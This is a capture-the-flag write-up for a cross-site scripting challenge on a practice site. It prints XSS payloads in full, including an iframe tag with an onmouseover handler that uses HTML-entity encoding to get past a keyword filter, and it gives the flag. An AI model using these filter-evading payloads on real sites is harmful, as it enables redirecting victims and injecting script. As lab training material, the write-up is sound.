# OSINT Challenge — "Cross Site Scripting"

## 🧭 Executive Summary
Can you redirect kenobi.hackingarena.com:821 to kenobi.hackingarena.com:822?

## 🧰 Methodology
First of all, we will try the simplest form of cross-site scripting to redirect and see where it leads us:
#<script>document.location='http://kenobi.hackingarena.com:821'</script>#. 

This did not work, and we see from the page source that the antihacker has blocked the words: “document”, “location” and “hacking”. So, we replace their first letters with their respective html code equivalents, and add an image tag before we try again:
#<img src=# onmouseover="&#00000100ocument.&#00000108ocation='http://kenobi.&#104&#97&#99&#107ingarena.com:822'"></img>#.

We see then that the "antihacker" stops the word “img”, so we try it again but this time with an “iframe” tag instead:

#<iframe src=# onmouseover="&#00000100ocument.&#00000108ocation='http://kenobi.&#104&#97&#99&#107ingarena.com:822'"></iframe>#.

This finally results in a successful redirection to “http://kenobi.hackingarena.com:822”, where we also find the flag for this task: “Hacking-Arena{Cross_Flag_is_here_for_you}”.


## 🧩 Lessons Learned
Input filters often target specific tokens; encoding and tag substitution can bypass simplistic filters.

## 🧠 Tags
'#crosssidescripting' '#xss' '#webhacking' '#ctf'

